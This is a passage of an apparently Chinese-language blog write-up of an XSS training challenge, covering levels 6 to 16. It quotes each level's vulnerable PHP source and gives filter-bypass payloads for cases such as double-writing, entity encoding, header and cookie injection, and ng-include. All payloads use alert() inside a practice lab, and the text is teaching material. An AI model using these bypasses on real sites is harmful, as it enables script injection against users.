class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有使用strtolower()函数，可以大小写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed SRC=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot; Onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558102420262.png" alt="1558102420262"></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>试一下事件属性</p><p><img src="/2019/05/20/XSS挑战之旅/1558105060724.png" alt="1558105060724"></p><p>on没了，被替换为空，接着试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/1558105341248.png" alt="1558105341248"></p><p>src和script也没了</p><p>想到了双写，成功绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed ssrcrc=javasscriptcript:alert(/XSS/);&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558105662485.png" alt="1558105662485"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>替换了一系列关键字，但是却替换为空值，所以可以利用双写绕过</p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><h3 id="属性值编码绕过"><a href="#属性值编码绕过" class="headerlink" title="属性值编码绕过"></a>属性值编码绕过</h3><p>这关有点不一样了</p><p><img src="/2019/05/20/XSS挑战之旅/1558105893509.png" alt="1558105893509"></p><p>试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/1558106118797.png" alt="1558106118797"></p><p>script和href被替换，再尝试on、src、<code>&quot;</code> 都会被替换，大小写也无法绕过</p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>第一处有html实体化转义，无法逃脱出来。第二处先转换大小写，然后黑名单过滤特殊字符和双引号；参考别人的文章，发现可以对HTML属性的值进行实体编码绕过</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558237810579.png" alt="1558237810579"></p><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><h3 id="格式验证绕过"><a href="#格式验证绕过" class="headerlink" title="格式验证绕过"></a>格式验证绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/1558248807926.png" alt="1558248807926"></p><p>提示链接不合法，应该是验证了链接的格式，输入<code>http://</code> 能成功写入</p><p><img src="/2019/05/20/XSS挑战之旅/1558248919987.png" alt="1558248919987"></p><p>那就继续构造带 <code>http://</code> 的拼接语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)//http://</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558249256987.png" alt="1558249256987"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>可以看出与level8的区别就在于多加了一个链接格式的判断，使用strpos()函数，查找<code>http://</code>出现的位置，但是改代码没有判断位置是否在开头，仅判断被查找的字符串即 <code>http://</code> 是否存在，所以可以在payload后面加上注释符和<code>http://</code>，即可成功绕过</p><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><h3 id="隐藏GET传参"><a href="#隐藏GET传参" class="headerlink" title="隐藏GET传参"></a>隐藏GET传参</h3><p>这关发现一个隐藏的表单</p><p><img src="/2019/05/20/XSS挑战之旅/1558250497766.png" alt="1558250497766"></p><p>但是没有提交按钮和提交页面</p><p><img src="/2019/05/20/XSS挑战之旅/1558250601339.png" alt="1558250601339"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>发现GET参数<code>t_sort</code>会被过滤<code>&lt;&gt;</code>输出，所以可以使用事件属性进行构造利用</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558251116826.png" alt="1558251116826"></p><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><h3 id="Referer头插入"><a href="#Referer头插入" class="headerlink" title="Referer头插入"></a>Referer头插入</h3><p>隐藏表单多了一个<code>&lt;input&gt;</code></p><p><img src="/2019/05/20/XSS挑战之旅/1558251262671.png" alt="1558251262671"></p><p>把全部表单的值通过GET参数传递过去</p><p><img src="/2019/05/20/XSS挑战之旅/1558251563250.png" alt="1558251563250"></p><p><img src="/2019/05/20/XSS挑战之旅/1558251601685.png" alt="1558251601685"></p><p>只有t_sort接收了get传参，看起来双引号被转义掉了，尝试了单引号也不行，又尝试了POST传参也不行</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>和上一关的代码类似，但是<code>t_sort</code>的值经过了html实体化转义，所以无法在此处进行利用了。不过新的<code>t_ref</code>，的值是通过referer头获取的，可以抓包修改Referer头的内容，插入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558252521803.png" alt="1558252521803"></p><p>总结：</p><p>要注意细节，寻找提示信息，不放过任何一处我们提交的数据内容</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><h3 id="UA头插入"><a href="#UA头插入" class="headerlink" title="UA头插入"></a>UA头插入</h3><p>在页面源码中发现User-Agent信息</p><p><img src="/2019/05/20/XSS挑战之旅/1558252884442.png" alt="1558252884442"></p><p>修改UA头部信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558253045262.png" alt="1558253045262"></p><p><img src="/2019/05/20/XSS挑战之旅/1558253074469.png" alt="1558253074469"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>跟上一关一样，区别就在于获取的请求头部信息变成了<code>User-Agent</code>，所以只需要抓包修改UA的内容即可</p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><h3 id="Cookie插入"><a href="#Cookie插入" class="headerlink" title="Cookie插入"></a>Cookie插入</h3><p>注意到cookie参数</p><p><img src="/2019/05/20/XSS挑战之旅/1558253383778.png" alt="1558253383778"></p><p>查看cookie内容</p><p><img src="/2019/05/20/XSS挑战之旅/1558253574394.png" alt="1558253574394"></p><p>修改cookie，插入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558253654942.png" alt="1558253654942"></p><p>成功触发XSS</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>跟之前一样，区别就在于获取的请求头部信息换成了获取cookie中的<code>user</code>的值，所以把cookie中user的值里插入payload即可</p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><h3 id="exif-xss"><a href="#exif-xss" class="headerlink" title="exif xss"></a>exif xss</h3><p>这关使用<code>&lt;iframe&gt;</code>嵌入了一个小网页（注意：需要访问到<code>外网</code>才能访问）</p><p><img src="/2019/05/20/XSS挑战之旅/1558254716646.png" alt="1558254716646"></p><p>发现搜索框有输出点</p><p><img src="/2019/05/20/XSS挑战之旅/1558254944255.png" alt="1558254944255"></p><p>尝试闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558255107617.png" alt="1558255107617"></p><p><img src="/2019/05/20/XSS挑战之旅/1558255149283.png" alt="1558255149283"></p><p>&lt;&gt;被转义掉了，感觉这里不存在可利用的点了。</p><p>看下源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只有一个iframe标签引用了<a href="http://exofvoewer.org/" target="_blank" rel="noopener">http://exofvoewer.org</a>，最后看了下<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">先知上的wp</a>，了解到这关考察的是exif xss，漏洞原理是通过修改图片的exif信息，造成解析图片exif触发XSS。</p><p><img src="/2019/05/20/XSS挑战之旅/1558360067701.png" alt="1558360067701"></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; &quot;&gt;&lt;img src=x onerror=alert(1)&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558358694058.png" alt="1558358694058"></p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><h3 id="文件包含插入"><a href="#文件包含插入" class="headerlink" title="文件包含插入"></a>文件包含插入</h3><p><img src="/2019/05/20/XSS挑战之旅/1558265228176.png" alt="1558265228176"></p><p>先试了一下闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558266783744.png" alt="1558266783744"></p><p><code>&lt;&gt;</code>被转义掉了，再试一下事件属性</p><p><img src="/2019/05/20/XSS挑战之旅/1558266984431.png" alt="1558266984431"></p><p>双引号也被转义掉了，一时没了思路，看了下网上的文章，说是要注意下面这里</p><p><img src="/2019/05/20/XSS挑战之旅/1558267117962.png" alt="1558267117962"></p><p>上网查了一下相关知识</p><p><img src="/2019/05/20/XSS挑战之旅/1558265795045.png" alt="1558265795045"></p><p>发现ng-include可以利用，因为不能跨域，所以包含一个前面的关卡，<code>&lt;script&gt;</code>没有成功，使用<code>&lt;img&gt;</code>成功触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?src=&apos;level1.php?name=&lt;/h2&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;h2&gt;&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558266253831.png" alt="1558266253831"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>此处只有一个输出点，被实体化转义过了，也不是单引号闭合，所以无法逃逸，只能从<code>ng-include</code>处入手了。</p><p>还有一点疑问，我们的payload明明被实体化转义掉了，为什么还可以再原样输出回来呢？</p><p>总结：</p><p>发现不一样，不了解的点时，多去查查相关资料，不能错过知识点外的机会。</p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><h3 id="空格字符绕过"><a href="#空格字符绕过" class="headerlink" title="空格字符绕过"></a>空格字符绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/1558267796468.png" alt="1558267796468"></p><p>尝试<code>&lt;script&gt;</code>标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558268014317.png" alt="1558268014317"></p><p><code>script</code> 和 <code>/</code> 替换为空，试一下<code>svg</code></p><p><img src="/2019/05/20/XSS挑战之旅/1558268343632.png" alt="1558268343632">发现只有空格被过滤掉，使用<code>%0a</code> <code>%0d</code>做分隔符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0aonload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br><span class="line">?keyword=&lt;svg%0donload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558268510194.png" alt="1558268510194"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 